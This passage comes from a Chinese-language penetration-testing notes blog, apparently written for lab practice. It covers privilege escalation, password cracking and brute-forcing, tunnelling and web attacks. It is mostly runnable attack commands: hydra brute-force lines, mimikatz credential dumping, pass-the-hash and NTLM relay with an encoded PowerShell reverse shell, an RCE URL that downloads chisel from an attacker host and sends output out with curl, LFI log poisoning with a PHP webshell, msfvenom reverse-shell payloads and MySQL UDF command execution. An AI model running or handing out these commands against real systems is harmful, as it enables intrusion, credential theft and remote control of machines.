class="language-bash">查找SUID文件，属于root用户的</span></span><br><span class="line">find / -perm -u=s -type f -user root 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>比如suid权限，就是当前用户在执行具有suid权限的可执行文件时，会临时把自己提升到root权限，假如vim有suid权限，那么就可以使用vim修改&#x2F;etc&#x2F;passwd文件，将里面的root用户的密码修改成攻击者自己生成的密码，然后<code>su -</code>切换到root身份</p><p>查看硬盘挂载信息，重点关注多硬盘的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line">mount</span><br><span class="line">lsblk</span><br></pre></td></tr></table></figure><p>查看环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure><p>web目录下的配置文件里也有可能有凭据信息，可以拿来密码复用试一下</p><p>查看具有cap权限的命令，然后把命令丢到<a href="https://gtfobins.github.io下找提权方法/">https://gtfobins.github.io下找提权方法</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>sudu权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前用户可以以sudo执行什么命令</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>自动化提权，linpeas，github开源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/peass-ng/PEASS-ng</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows下运行之前需要先修改一个注册表项</span></span><br><span class="line">REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Password Attack</title>
      <link href="/2024/06/05/Password-Attack/"/>
      <url>/2024/06/05/Password-Attack/</url>
      
        <content type="html"><![CDATA[<h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/share/wordlists/dirb/others/names.txt -p &quot;1234&quot; rdp://192.168.50.202</span><br><span class="line">hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 爆破POST登录框</span><br><span class="line"># ^后面跟变量，:后面跟报错信息</span><br><span class="line">hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;</span><br><span class="line"></span><br><span class="line"># 爆破http的登录，base64编码的认证，最后的/是指登录框的url</span><br><span class="line">hydra -l admin -P rockyou.txt -s 80 -f 192.168.211.201 http-get /</span><br><span class="line"></span><br><span class="line"># 爆破MySQL</span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.220.118 mysql</span><br><span class="line"></span><br><span class="line"># hydra 爆破登录框,POST请求爆破,F=后面是页面登录失败返回的错误信息，需要手动改</span><br><span class="line">hydra -L mail.txt -P ~/Desktop/rockyou.txt 10.0.2.47 -s 8000 http-post-form &quot;/api.php?/sessions:email=^USER^&amp;password=^PASS^:F=Incorrect. Try again or reset your password.&quot; -V -F -u</span><br><span class="line"></span><br><span class="line"># hydra 爆破ssh，参数的大小写是有区别的</span><br><span class="line">hydra -L 用户名文件 -p 指定密码 -f $IP ssh</span><br><span class="line">hydra -l 指定用户名 -p 指定密码 -f $IP ssh</span><br><span class="line">hydra -l 指定用户名 -P 指定密码文件 -f $IP ssh</span><br></pre></td></tr></table></figure><h3 id="破解kdbx数据文件"><a href="#破解kdbx数据文件" class="headerlink" title="破解kdbx数据文件"></a>破解kdbx数据文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keepass2john Database.kdbx &gt; keepass.hash</span><br><span class="line">cat keepass.hash</span><br><span class="line">删掉前面的database:</span><br><span class="line">hashcat -m 13400 keepass.hash /home/yu1e/Desktop/offsecExcercise/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force</span><br><span class="line">然后拿破解出来的密码打开.kdbx文件</span><br></pre></td></tr></table></figure><h3 id="破解ssh口令"><a href="#破解ssh口令" class="headerlink" title="破解ssh口令"></a>破解ssh口令</h3><p>有时候拿到了id_rsa不能直接用来登录，需要先破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh2john id_rsa &gt; ssh.hash</span><br><span class="line"># 搜索加密方式</span><br><span class="line">hashcat -h | grep -i &quot;ssh&quot;</span><br><span class="line">hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force</span><br><span class="line"># 如果破解成功</span><br><span class="line">ssh -i id_rsa -p 2222 dave@192.168.50.201</span><br></pre></td></tr></table></figure><h3 id="破解NTLM哈希"><a href="#破解NTLM哈希" class="headerlink" title="破解NTLM哈希"></a>破解NTLM哈希</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 系统权限启动</span><br><span class="line">.\mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line">将hash放到kali上命名未nelly.hash</span><br><span class="line">cat nelly.hash</span><br><span class="line">hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span><br></pre></td></tr></table></figure><h3 id="传递NTML哈希"><a href="#传递NTML哈希" class="headerlink" title="传递NTML哈希"></a>传递NTML哈希</h3><p>如果hash破解不了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 被控机器上执行</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line"></span><br><span class="line">#kali执行</span><br><span class="line">使用hash去登录smb服务</span><br><span class="line">smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</span><br><span class="line"># kali执行用hash直接登录</span><br><span class="line">impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</span><br><span class="line">impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</span><br></pre></td></tr></table></figure><h3 id="破解Net-NTLMv2"><a href="#破解Net-NTLMv2" class="headerlink" title="破解Net-NTLMv2"></a>破解Net-NTLMv2</h3><p>如果拿到的被控主机权限没有权限执行mimikatz，可以在在几乎所有的 Windows 网络和环境中发现 Net-NTLMv2</p><p>Responder工具非常适合此目的。它包括一个内置的 SMB 服务器，可为我们处理身份验证过程并打印所有捕获的 Net-NTLMv2 哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># kali执行，tap0是网卡名称</span><br><span class="line">sudo responder -I tap0</span><br><span class="line"># 被控机器执行，这里的IP是kali的IP</span><br><span class="line">dir \\192.168.119.2\test</span><br><span class="line"># 然后kali会拿到一串hash，NTLMv2-SSP Hash</span><br><span class="line"># kali执行</span><br><span class="line">cat paul.hash</span><br><span class="line">hashcat --help | grep -i &quot;ntlm&quot;</span><br><span class="line">hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><h3 id="中继Net-NTMLv2"><a href="#中继Net-NTMLv2" class="headerlink" title="中继Net-NTMLv2"></a>中继Net-NTMLv2</h3><p>假设我们获得了 Net-NTLMv2 哈希，但由于它太复杂而无法破解它，这里不会仅仅打印身份验证步骤中使用的 Net-NTLMv2 哈希，而是将其转发到目标机器</p><p>还是使用dir命令来创建与 Kali 机器的 SMB 连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Kali执行，这里的shell是反弹shell</span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span><br><span class="line">nc -nvlp 8080</span><br><span class="line"># 被控机器执行，这里的IP是Kali的IP</span><br><span class="line">dir \\192.168.119.2\test</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tunnel Technology</title>
      <link href="/2024/06/05/Tunnel-Technology/"/>
      <url>/2024/06/05/Tunnel-Technology/</url>
      
        <content type="html"><![CDATA[<h2 id="使用socat进行转发"><a href="#使用socat进行转发" class="headerlink" title="使用socat进行转发"></a>使用socat进行转发</h2><p>被控机器执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -ddd TCP-LISTEN:本地监听端口,fork TCP:内网目标机器:目标端口</span><br></pre></td></tr></table></figure><h2 id="SSH隧道搭建"><a href="#SSH隧道搭建" class="headerlink" title="SSH隧道搭建"></a>SSH隧道搭建</h2><h3 id="SSH端口本地端口转发"><a href="#SSH端口本地端口转发" class="headerlink" title="SSH端口本地端口转发"></a>SSH端口本地端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 被控机器运行</span><br><span class="line"># 0.0.0.0:4455是ssh client的地址和端口</span><br><span class="line"># 172.16.50.217:445是目的IP和端口</span><br><span class="line"># database_admin@10.4.50.215是ssh server的凭证（也就是内网机器）</span><br><span class="line">ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215</span><br><span class="line"></span><br><span class="line">#攻击机访问confluence机器的4455端口就可以smb连上内网的HRSHARES，前提是知道PGDATABASE01的ssh凭证</span><br></pre></td></tr></table></figure><p><a href="https://smms.app/image/iHdG7UNCjYJtTqP" target="_blank"><img src="https://s2.loli.net/2024/05/26/iHdG7UNCjYJtTqP.png" alt="ssh.png"></a></p><h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><p>被控机器执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215</span><br></pre></td></tr></table></figure><p>相当于被控机器就是sock代理，<a href="mailto:&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#101;&#95;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#49;&#x30;&#x2e;&#52;&#x2e;&#53;&#48;&#46;&#x32;&#49;&#53;">&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#101;&#95;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#49;&#x30;&#x2e;&#52;&#x2e;&#53;&#48;&#46;&#x32;&#49;&#53;</a>是内网主机的SSH</p><p>这种方法的前提是知道PGDATABASE01的ssh口令</p><p>然后修改&#x2F;etc&#x2F;proxychains4.conf为被控机器的9999端口，使用proxychains连接</p><p><a href="https://smms.app/image/e3fn2U6WlSXYgF7" target="_blank"><img src="https://s2.loli.net/2024/06/05/e3fn2U6WlSXYgF7.png" ></a></p><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># kali@192.168.118.4是攻击机的ssh</span><br><span class="line"># 10.4.50.215:5432是目标机器</span><br><span class="line"># 如果要连目标机器的5432端口，攻击机直接访问本机的2345端口</span><br><span class="line"></span><br><span class="line"># Kali开启ssh</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4</span><br></pre></td></tr></table></figure><h3 id="SSH远程动态端口转发"><a href="#SSH远程动态端口转发" class="headerlink" title="SSH远程动态端口转发"></a>SSH远程动态端口转发</h3><p>被控机器执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali@192.168.118.4是攻击机的ssh</span><br><span class="line">ssh -N -R 9998 kali@192.168.118.4</span><br><span class="line">ssh -f -N -R 1080 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -i /var/lib/mysql/.ssh/id rsa kali@KaliIP</span><br></pre></td></tr></table></figure><p>攻击机直接挂proxychains修改代理为本地的9998</p><h2 id="使用chisel建立隧道"><a href="#使用chisel建立隧道" class="headerlink" title="使用chisel建立隧道"></a>使用chisel建立隧道</h2><p>方法一</p><p>先将chisel上传到目标服务器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.231.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.192/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/</span><br><span class="line"></span><br><span class="line"># 实际上就是被控机器执行命令</span><br><span class="line">wget 192.168.118.4/chisel -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel</span><br></pre></td></tr></table></figure><p>然后攻击机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server --port 8080 --reverse</span><br></pre></td></tr></table></figure><p>随后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -nvvvXi tun0 tcp port 8080</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.231.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.192:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.192:8080/%27%29.start%28%29%22%29%7D/</span><br><span class="line"></span><br><span class="line"># 实际上就是执行，R表示反向socks隧道默认port 1080</span><br><span class="line">/tmp/chisel client 192.168.118.4:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>然后攻击机安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ncat</span><br><span class="line"></span><br><span class="line"># database_admin@10.4.50.215是内网机器</span><br><span class="line">ssh -o ProxyCommand=&#x27;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#x27; database_admin@10.4.50.215</span><br></pre></td></tr></table></figure><p>方法二</p><p>kali搭建chisel服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 4040 --reverse</span><br></pre></td></tr></table></figure><p>Windows运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe client 目标IP:4040 R:socks</span><br></pre></td></tr></table></figure><p>然后使用proxychain配置socks5代理，然后扫内网</p><h2 id="使用netsh进行端口转发"><a href="#使用netsh进行端口转发" class="headerlink" title="使用netsh进行端口转发"></a>使用netsh进行端口转发</h2><p>windows上（需要管理员权限）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=本地IP地址 connectport=80 connectaddress=目标IP地址</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Application Attack</title>
      <link href="/2024/06/05/Web-Application-Attack/"/>
      <url>/2024/06/05/Web-Application-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="Web拿权限"><a href="#Web拿权限" class="headerlink" title="Web拿权限"></a>Web拿权限</h2><h3 id="文件包含漏洞结合访问日志达到RCE"><a href="#文件包含漏洞结合访问日志达到RCE" class="headerlink" title="文件包含漏洞结合访问日志达到RCE"></a>文件包含漏洞结合访问日志达到RCE</h3><p>假设有个LFI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.237.80/console/file.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p>然后拿到了natraj 和 mahakal两个用户名，尝试SSH爆破无果</p><p>然后尝试去读取两个用户目录下的id_rsa文件，也失败了</p><p>尝试去读取机器上的登录日志文件，Linux上的登录日志文件在&#x2F;var&#x2F;log&#x2F;auth.log</p><p>后面就是使用LFI 和 SSH 登录日志文件达到RCE的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&#x27;@192.168.237.80</span><br></pre></td></tr></table></figure><p>这里有个问题，就是SSH在升级之后是不允许使用此类用户名，只能用msf里的auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login，设置用户名和密码，密码随意，然后run</p><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.212.80/console/file.php?file=/var/log/auth.log&amp;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>上php马，拿到shell</p><h2 id="常见目录"><a href="#常见目录" class="headerlink" title="常见目录"></a>常见目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/sitemap.xml</span><br><span class="line">/humans.txt</span><br><span class="line"></span><br><span class="line">tomcat /manager/html</span><br><span class="line">phpmyadmin /phpmyadmin</span><br></pre></td></tr></table></figure><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-r表示非递归爆破目录，-z表示每次请求增加10毫秒延时</span></span><br><span class="line">dirb http://www.megacorpone.com/ admin.txt -r -z 10</span><br><span class="line">dirsearch -u $URL -f -e php,txt,html</span><br><span class="line">dirsearch -u $URL -f -e php,txt,html -w /user/share/seclists/...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用hakrawler爬取页面所有链接</span></span><br><span class="line">echo &quot;https://xxx.xxx&quot; | hakrawler</span><br></pre></td></tr></table></figure><p>有的网页会设置Anti CSRF token，也就是发送一次请求，返回的数据中会带有一个token，下次请求就必须带上这个token进行请求，否则不会校验密码，具体怎么绕过进行爆破网上很多教程</p><h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># wpscan</span><br><span class="line">只能扫首页，不是登录页面</span><br><span class="line">wpscan --url http://blogger.thm/assets/fonts/blog/ --enumerate p --plugins-detection aggressive</span><br><span class="line">wpscan --url sandbox.local --enumerate ap,at,cb,dbe</span><br><span class="line">wpscan --api-token $wPSCAN_KEY --url http:/llsandbox.local/wp -e</span><br><span class="line"># 爆破</span><br><span class="line">wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login</span><br></pre></td></tr></table></figure><p>扫出来的结果看版本、看插件</p><p>搜索wp的插件漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -update</span><br><span class="line">searchsploit elementor</span><br><span class="line">searchsploit ocear-extra</span><br><span class="line">searchsploit wp-survey-and-poll</span><br><span class="line">searchsploit ocean</span><br><span class="line">searchsploit survey poll</span><br></pre></td></tr></table></figure><p>如果拿到了wp的密码密文，丢到爆破里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$PASS&#x27; &gt; pass.txt</span><br><span class="line">john --wordlist=rockyou.txt pass.txt</span><br></pre></td></tr></table></figure><p>然后登录后台，上传插件的webshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install seclists # 包含wp插件</span><br><span class="line">ls /usr/share/seclists/Web-Shells/WordPress</span><br><span class="line">sudo zip plugin-shell.zip plugin-shell.php</span><br></pre></td></tr></table></figure><p>然后执行wget从攻击机下载回弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p xxx LHOST=xxx LPORT=xxx -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>然后去web目录下找配置文件里的数据库账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/web-config.php</span><br></pre></td></tr></table></figure><h2 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h2><p>技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav</span><br></pre></td></tr></table></figure><p>nmap扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-webdav-scan: </span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK</span><br></pre></td></tr></table></figure><p>漏洞利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T &#x27;shell.aspx&#x27; &#x27;http://$VictimIP/&#x27; -u &lt;username&gt;:&lt;password&gt;</span><br></pre></td></tr></table></figure><p>然后访问网马，本地开监听</p><h2 id="MySQL-UDF执行命令"><a href="#MySQL-UDF执行命令" class="headerlink" title="MySQL UDF执行命令"></a>MySQL UDF执行命令</h2><p>UDF的库文件位于</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate lib_mysqludf_sys.so # linux</span><br><span class="line">locate lib_mysqludf_sys.dll #windows</span><br></pre></td></tr></table></figure><p>生成库文件的二进制流</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#x27;\n&#x27; &gt; lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure><p>用hex文件内容传入MySQL变量shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mysql执行</span></span><br><span class="line">set @shell = xxxxxxx;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看插件目录、文件操作权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">show variables like &#x27;%secure_file_priv%&#x27;; # 如果没有权限写入插件目录，那就不能用UDF执行系统命令</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果有权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql执行</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将二进制shellcode转储到插件目录文件</span></span><br><span class="line">select binary @shell into dumpfile &#x27;/home/dev/plugin/udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用库文件创建MySQL函数</span></span><br><span class="line">create function sys_exec returns int soname &#x27;udf_sys_exec.so&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证函数创建成功</span></span><br><span class="line">select * from mysql.func where name=&#x27;sys_exec&#x27;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机执行msfconsole，使用/exploit/multi/handler</span></span><br><span class="line">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控机器上下载shell并执行</span></span><br><span class="line">select sys_exec(&#x27;wget ...&#x27;)</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a href="#文件包含" class="headerlink" 